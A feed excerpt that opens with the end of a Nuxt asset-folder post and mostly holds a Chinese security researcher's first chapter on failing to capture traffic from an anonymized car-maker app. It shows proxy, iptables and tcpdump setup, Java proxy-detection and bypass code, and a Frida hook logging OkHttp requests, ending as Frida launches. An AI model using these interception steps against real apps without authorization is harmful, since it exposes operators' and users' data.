&lt;img src="/documentation/large.png" alt="架构图" &gt;
</code></pre>
<h3 data-id="heading-9">动态</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
// 使用 import 获取 assets 资源（会经过构建处理）
import logo from '~/assets/images/logo.png'

// 使用相对路径引用 public 资源
const publicImage = '/images/banner.png'
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-10">css中用</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 在 CSS 中引用 assets 资源 */</span>
<span class="hljs-selector-class">.hero</span> {
  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'~/assets/images/bg.jpg'</span>);
}

<span class="hljs-comment">/* 引用 public 资源 */</span>
<span class="hljs-selector-class">.external</span> {
  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'/external-bg.png'</span>);
}
</code></pre>
<h2 data-id="heading-11">提醒</h2>
<ol>
<li>
<p><strong>缓存策略</strong>：</p>
<ul>
<li><code>assets/</code> 中的文件通常会添加哈希值，便于缓存管理</li>
<li><code>public/</code> 中的文件使用原始名称，需手动管理缓存</li>
</ul>
</li>
<li>
<p><strong>部署考虑</strong>：</p>
<ul>
<li><code>public/</code> 目录内容会原样复制到构建输出</li>
<li><code>assets/</code> 目录内容会被处理并打包</li>
</ul>
</li>
<li>
<p><strong>性能优化</strong>：</p>
<ul>
<li>小图标建议使用 <code>assets/</code> 以便打包优化</li>
<li>大文件（如视频）建议使用 <code>public/</code> 避免构建过程变慢</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[序章：当抓包工具遇上"铜墙铁壁"]]></title>    <link>https://juejin.cn/post/7592887786966204452</link>    <guid>https://juejin.cn/post/7592887786966204452</guid>    <pubDate>2026-01-09T03:05:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592887786966204452" data-draft-id="7592846242176450594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="序章：当抓包工具遇上&quot;铜墙铁壁&quot;"/> <meta itemprop="keywords" content="安全"/> <meta itemprop="datePublished" content="2026-01-09T03:05:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="边际效应"/> <meta itemprop="url" content="https://juejin.cn/user/626060316652204"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            序章：当抓包工具遇上"铜墙铁壁"
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/626060316652204/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    边际效应
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:05:50.000Z" title="Fri Jan 09 2026 03:05:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">序章：当抓包工具遇上"铜墙铁壁"</h2>
<blockquote>
<p><strong>本章字数：约5500字</strong>
<strong>阅读时间：约18分钟</strong>
<strong>难度等级：★★☆☆☆</strong></p>
<p><strong>声明</strong>：本文中的公司名称、包名、API地址、密钥等均已脱敏处理，使用虚构名称替代。"梦想世界"、"dreamworld"等均为虚构名称，与任何真实公司无关。</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">引言</h3>
<p>2026年1月5日，深夜23:15。</p>
<p>实验室里只有显示器的微光和咖啡机偶尔发出的咕噜声。我坐在工位前，手指在键盘上轻轻敲击，屏幕上的Charles Proxy正在等待连接。作为一名有十年经验的安全研究员，我已经习惯了深夜的工作节奏，也习惯了各种APP的安全防护措施。</p>
<p>但今晚，我即将遇到一个让我整整困扰多天的对手。</p>
<p>这款APP来自国内某知名新能源车企，内部代号为"dw_mall_shop"，对外显示为"梦想世界"，当前版本v8.x.x。我之所以选择这款APP进行安全测试，是因为近年来车企APP的数据安全问题日益突出。</p>
<p>用户的车辆数据、行驶轨迹、个人信息都通过这类APP进行传输，其安全防护水平直接关系到用户的隐私和财产安全。作为安全研究员，评估这类APP的安全性是我们的职责所在。</p>
<hr/>
<h3 data-id="heading-2">1.1 第一次尝试：常规抓包</h3>
<p>按照常规流程，我的第一步是进行抓包分析，了解APP与服务器之间的通信协议和数据格式。这是逆向工程的基础——只有了解了数据是如何传输的，才能进一步分析数据是如何生成的。</p>
<p>我熟练地完成了抓包环境的配置：</p>
<h4 data-id="heading-3">1.1.1 环境准备</h4>
<p><strong>测试设备</strong>：</p>
<ul>
<li>手机：Pixel 6 Pro，Android 13</li>
<li>电脑：MacBook Pro M2，macOS Ventura</li>
<li>抓包工具：Charles Proxy 4.6.4</li>
</ul>
<p><strong>配置步骤</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 启动Charles Proxy</span>
<span class="hljs-comment"># 默认监听端口：8888</span>

<span class="hljs-comment"># 2. 在手机上配置WiFi代理</span>
<span class="hljs-comment"># 设置 -&gt; WiFi -&gt; 当前网络 -&gt; 代理 -&gt; 手动</span>
<span class="hljs-comment"># 服务器：电脑IP地址</span>
<span class="hljs-comment"># 端口：8888</span>

<span class="hljs-comment"># 3. 安装Charles根证书</span>
<span class="hljs-comment"># 在手机浏览器访问 chls.pro/ssl</span>
<span class="hljs-comment"># 下载并安装证书</span>
<span class="hljs-comment"># 设置 -&gt; 安全 -&gt; 加密与凭据 -&gt; 安装证书</span>
</code></pre>
<p><strong>验证配置</strong>：</p>
<p>为了确认代理配置正确，我先用手机浏览器访问了几个网站：</p>
<pre><code class="hljs language-arduino" lang="arduino">✓ https:<span class="hljs-comment">//www.baidu.com - Charles成功捕获</span>
✓ https:<span class="hljs-comment">//www.google.com - Charles成功捕获</span>
✓ https:<span class="hljs-comment">//api.github.com - Charles成功捕获</span>
</code></pre>
<p>一切正常。代理配置没有问题。</p>
<h4 data-id="heading-4">1.1.2 启动目标APP</h4>
<p>深吸一口气，我点击了"梦想世界"的图标。</p>
<p>APP正常启动了。启动画面、加载动画、主界面——一切看起来都很正常。我开始在APP中进行各种操作：</p>
<ul>
<li>浏览商城首页</li>
<li>查看商品详情</li>
<li>搜索商品</li>
<li>查看个人中心</li>
</ul>
<p>APP响应流畅，数据加载正常，图片显示清晰。从用户体验的角度来看，这是一款非常优秀的APP。</p>
<p><strong>然而，当我切换到Charles窗口时，我愣住了。</strong></p>
<p>Charles的请求列表——<strong>空空如也</strong>。</p>
<p>没有任何HTTP请求。没有任何HTTPS请求。什么都没有。</p>
<p>我以为是自己眼花了，揉了揉眼睛，仔细看了看屏幕。确实是空的。</p>
<h4 data-id="heading-5">1.1.3 排查问题</h4>
<p>"不可能啊，"我自言自语道，"APP明明在正常加载数据，怎么可能没有网络请求？"</p>
<p>我开始排查可能的问题：</p>
<p><strong>检查1：代理配置</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在手机上确认代理设置</span>
设置 -&gt; WiFi -&gt; 当前网络 -&gt; 代理
<span class="hljs-comment"># 显示：手动，服务器：192.168.1.100，端口：8888</span>
<span class="hljs-comment"># 配置正确 ✓</span>
</code></pre>
<p><strong>检查2：Charles监听状态</strong></p>
<pre><code class="hljs language-bash" lang="bash">Charles -&gt; Proxy -&gt; Proxy Settings
<span class="hljs-comment"># 端口：8888</span>
<span class="hljs-comment"># 启用透明代理：是</span>
<span class="hljs-comment"># 状态正常 ✓</span>
</code></pre>
<p><strong>检查3：证书安装</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在手机上确认证书</span>
设置 -&gt; 安全 -&gt; 加密与凭据 -&gt; 用户凭据
<span class="hljs-comment"># 显示：Charles Proxy CA</span>
<span class="hljs-comment"># 证书已安装 ✓</span>
</code></pre>
<p><strong>检查4：其他APP测试</strong></p>
<p>我打开了手机上的其他几个APP进行测试：</p>
<pre><code class="hljs">✓ 微信 - Charles成功捕获请求
✓ 淘宝 - Charles成功捕获请求
✓ 抖音 - Charles成功捕获请求
</code></pre>
<p>其他APP都能正常抓包，只有"梦想世界"抓不到。</p>
<p><strong>这说明问题出在APP本身，而不是我的抓包环境。</strong></p>
<hr/>
<h3 data-id="heading-6">1.2 深入分析：为什么抓不到？</h3>
<h4 data-id="heading-7">1.2.1 排除SSL Pinning</h4>
<p>我的第一反应是：这可能是SSL Pinning导致的。</p>
<p>SSL Pinning（证书锁定）是一种常见的安全措施，APP会验证服务器证书是否与预期的证书匹配。如果不匹配（比如使用了Charles的代理证书），就会拒绝连接。</p>
<p>但是，SSL Pinning通常会导致以下现象：</p>
<ul>
<li>APP显示网络错误</li>
<li>APP提示"无法连接到服务器"</li>
<li>Charles中显示SSL握手失败</li>
</ul>
<p>而我观察到的现象是：</p>
<ul>
<li>APP正常运行</li>
<li>数据正常加载</li>
<li>Charles中什么都没有</li>
</ul>
<p><strong>这不像是SSL Pinning的表现。</strong></p>
<h4 data-id="heading-8">1.2.2 一个关键发现</h4>
<p>就在我百思不得其解的时候，我想起了一件事。</p>
<p>前几天，我在这台手机上安装了一款科学上网工具（类似VPN的代理软件），用于访问一些国外的技术文档。这款工具使用的是SOCKS5代理协议。</p>
<p>我突然好奇：如果开启这个科学上网工具，"梦想世界"APP还能正常使用吗？</p>
<p>我打开了科学上网工具，然后启动"梦想世界"APP。</p>
<p><strong>APP完全正常！</strong></p>
<p>数据加载正常，功能使用正常，没有任何异常提示。</p>
<p>这个发现让我陷入了沉思。</p>
<h4 data-id="heading-9">1.2.3 代理类型的差异</h4>
<p>让我们来分析一下不同代理类型的工作原理：</p>
<p><strong>HTTP代理（Charles使用）</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">┌─────────┐    HTTP请求    ┌─────────┐    HTTP请求    ┌─────────┐
│   APP   │ ────────────&gt; │  Charles │ ────────────&gt; │  服务器  │
└─────────┘               └─────────┘               └─────────┘
<span class="hljs-code">                               │
                          解析HTTP协议
                          记录请求内容
</span></code></pre>
<p><strong>SOCKS5代理（科学上网工具使用）</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">┌─────────┐    TCP连接     ┌─────────┐    TCP连接     ┌─────────┐
│   APP   │ ────────────&gt; │  SOCKS5  │ ────────────&gt; │  服务器  │
└─────────┘               └─────────┘               └─────────┘
<span class="hljs-code">                               │
                          只转发TCP数据
                          不解析应用层协议
</span></code></pre>
<p><strong>关键区别</strong>：</p>
<ul>
<li>HTTP代理工作在应用层（第7层），需要解析HTTP协议</li>
<li>SOCKS5代理工作在会话层（第5层），只负责转发TCP数据</li>
</ul>
<p><strong>这意味着什么？</strong></p>
<p>APP可能实现了这样的逻辑：</p>
<ol>
<li>检测系统是否设置了HTTP代理</li>
<li>如果检测到HTTP代理，就绕过系统网络栈，使用自定义的网络通信方式</li>
<li>如果没有检测到HTTP代理（或者是SOCKS代理），就正常通信</li>
</ol>
<p>这是一种<strong>精准打击</strong>的策略：</p>
<ul>
<li>针对安全研究员的抓包工具（HTTP代理）：完全失效</li>
<li>针对普通用户的科学上网需求（SOCKS代理）：正常使用</li>
</ul>
<p><strong>太精妙了！</strong></p>
<hr/>
<h3 data-id="heading-10">1.3 验证假设：代理检测机制</h3>
<h4 data-id="heading-11">1.3.1 系统代理检测</h4>
<p>在Android系统中，HTTP代理设置可以通过以下方式获取：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 方法1：通过System.getProperty获取</span>
<span class="hljs-type">String</span> <span class="hljs-variable">proxyHost</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">"http.proxyHost"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">proxyPort</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">"http.proxyPort"</span>);

<span class="hljs-comment">// 方法2：通过ProxySelector获取</span>
<span class="hljs-type">ProxySelector</span> <span class="hljs-variable">selector</span> <span class="hljs-operator">=</span> ProxySelector.getDefault();
List&lt;Proxy&gt; proxies = selector.select(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(<span class="hljs-string">"https://api.example.com"</span>));

<span class="hljs-comment">// 方法3：通过ConnectivityManager获取（Android特有）</span>
<span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
<span class="hljs-type">ProxyInfo</span> <span class="hljs-variable">proxyInfo</span> <span class="hljs-operator">=</span> cm.getDefaultProxy();
</code></pre>
<p>如果APP在发起网络请求之前检测这些值，就能知道系统是否设置了HTTP代理。</p>
<h4 data-id="heading-12">1.3.2 WiFi代理检测</h4>
<p>除了系统级别的代理设置，Android还支持针对特定WiFi网络设置代理：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 获取当前WiFi配置</span>
<span class="hljs-type">WifiManager</span> <span class="hljs-variable">wifiManager</span> <span class="hljs-operator">=</span> (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
<span class="hljs-type">WifiInfo</span> <span class="hljs-variable">wifiInfo</span> <span class="hljs-operator">=</span> wifiManager.getConnectionInfo();
<span class="hljs-type">WifiConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> getWifiConfiguration(wifiInfo.getNetworkId());

<span class="hljs-comment">// 检查代理设置</span>
<span class="hljs-keyword">if</span> (config.getProxySettings() == ProxySettings.STATIC) {
    <span class="hljs-type">ProxyInfo</span> <span class="hljs-variable">proxyInfo</span> <span class="hljs-operator">=</span> config.getHttpProxy();
    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> proxyInfo.getHost();
    <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> proxyInfo.getPort();
    <span class="hljs-comment">// 检测到代理！</span>
}
</code></pre>
<h4 data-id="heading-13">1.3.3 绕过代理的方法</h4>
<p>一旦检测到代理，APP可以使用以下方法绕过：</p>
<p><strong>方法1：使用NO_PROXY</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建不使用代理的OkHttpClient</span>
<span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
    .proxy(Proxy.NO_PROXY)  <span class="hljs-comment">// 明确指定不使用代理</span>
    .build();
</code></pre>
<p><strong>方法2：自定义SocketFactory</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建直连的Socket，绕过系统代理</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectSocketFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SocketFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Socket <span class="hljs-title function_">createSocket</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>();
        <span class="hljs-comment">// 直接连接，不经过代理</span>
        <span class="hljs-keyword">return</span> socket;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Socket <span class="hljs-title function_">createSocket</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>();
        socket.connect(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(host, port));
        <span class="hljs-keyword">return</span> socket;
    }
}
</code></pre>
<p><strong>方法3：使用自定义DNS</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 绕过系统DNS，直接使用IP地址</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectDns</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Dns</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;InetAddress&gt; <span class="hljs-title function_">lookup</span><span class="hljs-params">(String hostname)</span> <span class="hljs-keyword">throws</span> UnknownHostException {
        <span class="hljs-comment">// 使用硬编码的IP地址，或者自定义DNS服务器</span>
        <span class="hljs-keyword">if</span> (hostname.equals(<span class="hljs-string">"api.dreamworld.com"</span>)) {
            <span class="hljs-keyword">return</span> Arrays.asList(InetAddress.getByName(<span class="hljs-string">"1.2.3.4"</span>));
        }
        <span class="hljs-keyword">return</span> Dns.SYSTEM.lookup(hostname);
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-14">1.4 更多尝试：寻找突破口</h3>
<h4 data-id="heading-15">1.4.1 VPN抓包</h4>
<p>既然HTTP代理不行，我尝试使用VPN方式抓包。</p>
<p><strong>工具：HttpCanary</strong></p>
<p>HttpCanary是一款Android平台的抓包工具，它通过创建本地VPN来捕获所有网络流量。</p>
<pre><code class="hljs language-markdown" lang="markdown">┌─────────┐    所有流量    ┌─────────────┐    转发    ┌─────────┐
│   APP   │ ────────────&gt; │ HttpCanary  │ ────────&gt; │  服务器  │
└─────────┘               │   (VPN)     │           └─────────┘
<span class="hljs-code">                          └─────────────┘
                                │
                           捕获所有流量
</span></code></pre>
<p><strong>测试结果</strong>：</p>
<p>安装HttpCanary，启动VPN，然后打开"梦想世界"APP。</p>
<p><strong>依然抓不到任何数据。</strong></p>
<p>APP正常运行，但HttpCanary中没有任何来自"梦想世界"的请求记录。</p>
<h4 data-id="heading-16">1.4.2 iptables流量转发</h4>
<p>在Root设备上，我尝试使用iptables强制转发所有流量：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 将所有443端口的流量转发到本地代理</span>
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8888

<span class="hljs-comment"># 将所有80端口的流量转发到本地代理</span>
iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8888
</code></pre>
<p><strong>测试结果</strong>：</p>
<p><strong>还是抓不到。</strong></p>
<p>APP似乎使用了非标准端口，或者有其他方式绑过iptables规则。</p>
<h4 data-id="heading-17">1.4.3 Wireshark抓包</h4>
<p>作为最后的尝试，我使用Wireshark在路由器层面抓包：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在路由器上运行tcpdump</span>
tcpdump -i eth0 host 手机IP -w capture.pcap
</code></pre>
<p><strong>测试结果</strong>：</p>
<p>终于抓到了一些数据！但是：</p>
<ul>
<li>所有数据都是加密的（TLS 1.3）</li>
<li>无法看到HTTP请求的具体内容</li>
<li>只能看到连接的目标IP和端口</li>
</ul>
<p>这证实了APP确实在进行网络通信，只是我们无法通过常规手段看到通信内容。</p>
<hr/>
<h3 data-id="heading-18">1.5 阶段性总结</h3>
<p>经过一个晚上的尝试，我对这款APP的网络防护有了初步了解：</p>
<h4 data-id="heading-19">1.5.1 防护特点</h4>

























<table><thead><tr><th>特点</th><th>说明</th></tr></thead><tbody><tr><td><strong>精准检测</strong></td><td>只检测HTTP代理，不影响SOCKS代理</td></tr><tr><td><strong>静默处理</strong></td><td>检测到代理后不崩溃，而是切换通信方式</td></tr><tr><td><strong>用户友好</strong></td><td>普通用户完全感知不到异常</td></tr><tr><td><strong>多层防护</strong></td><td>HTTP代理、VPN、iptables都无法突破</td></tr></tbody></table>
<h4 data-id="heading-20">1.5.2 技术推测</h4>
<p>基于观察到的现象，我推测APP可能使用了以下技术：</p>
<ol>
<li><strong>代理检测</strong>：在应用启动时检测系统代理设置</li>
<li><strong>通信切换</strong>：检测到代理后，切换到直连模式</li>
<li><strong>自定义网络栈</strong>：使用自定义的Socket实现，绕过系统网络层</li>
<li><strong>非标准端口</strong>：可能使用非80/443的端口进行通信</li>
</ol>
<h4 data-id="heading-21">1.5.3 下一步计划</h4>
<p>既然网络层的抓包行不通，我需要换一个思路：</p>
<ol>
<li><strong>静态分析</strong>：反编译APK，分析代码逻辑</li>
<li><strong>动态调试</strong>：使用Frida等工具Hook网络请求</li>
<li><strong>模拟执行</strong>：如果动态调试也被阻止，考虑使用Unidbg</li>
</ol>
<hr/>
<h3 data-id="heading-22">1.6 意外发现：Frida的命运</h3>
<p>在结束这个晚上的工作之前，我决定快速尝试一下Frida。</p>
<p>Frida是一款强大的动态插桩工具，可以在运行时注入代码到目标进程中。如果能用Frida Hook住网络请求相关的函数，就能看到APP发送的数据。</p>
<h4 data-id="heading-23">1.6.1 准备Frida环境</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装Frida</span>
pip install frida-tools

<span class="hljs-comment"># 在手机上启动frida-server</span>
adb push frida-server /data/local/tmp/
adb shell <span class="hljs-built_in">chmod</span> +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &amp;
</code></pre>
<h4 data-id="heading-24">1.6.2 编写Hook脚本</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// hook_network.js</span>
<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Starting network hook..."</span>);
    
    <span class="hljs-comment">// Hook OkHttp的请求方法</span>
    <span class="hljs-keyword">var</span> <span class="hljs-title class_">OkHttpClient</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">'okhttp3.OkHttpClient'</span>);
    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Request</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">'okhttp3.Request'</span>);
    
    <span class="hljs-title class_">OkHttpClient</span>.<span class="hljs-property">newCall</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">request</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] ========== New Request =========="</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] URL: "</span> + request.<span class="hljs-title function_">url</span>().<span class="hljs-title function_">toString</span>());
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Method: "</span> + request.<span class="hljs-title function_">method</span>());
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Headers: "</span> + request.<span class="hljs-title function_">headers</span>().<span class="hljs-title function_">toString</span>());
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">newCall</span>(request);
    };
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Hook installed!"</span>);
});
</code></pre>
<h4 data-id="heading-25">1.6.3 运行Frida</h4>
<pre><code class="hljs language-bash" lang="bash">frida -U -f com.dreamworld.app -l hook_network.js --no-pause
</code></pre>
<p><strong>结果</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">     ____
    / _  |   Frida 16.1.4 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       <span class="hljs-built_in">help</span>      -&gt; Displays the <span class="hljs-built_in">help</span> system
   . . . .       object?   -&gt; Display information about <span class="hljs-string">'object'</span>
   . . . .       <span class="hljs-built_in">exit</span>/quit -&gt; Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Pixel 6 Pro (<span class="hljs-built_in">id</span>=192.168.1.101:5555)
Spawning `com.dreamworld.app`...
